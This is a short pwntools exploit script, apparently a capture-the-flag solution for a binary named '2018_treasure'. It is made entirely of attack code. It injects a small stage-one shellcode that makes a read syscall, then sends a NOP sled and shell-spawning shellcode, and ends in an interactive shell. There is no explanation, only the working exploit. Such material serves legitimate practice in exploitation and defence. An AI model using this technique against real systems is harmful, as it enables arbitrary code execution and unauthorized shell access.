from pwn import *		
context(log_level='debug',os='linux',arch='amd64')
pwnfile = './2018_treasure'
io=process(pwnfile)

elf = ELF(pwnfile)			
	
def debug():
	gdb.attach(io)
	pause()

debug()
pay = asm(
'''
    push rsi
    push rdx
    pop rsi
    pop rdx
    xor rdi,rdi
    syscall
'''
)

io.sendlineafter("will you continue?(enter 'n' to quit) :","y")

io.sendafter("start!!!!",pay)
nop = asm("nop")
io.sendline(nop*20 + asm(shellcraft.sh()))
io.interactive()
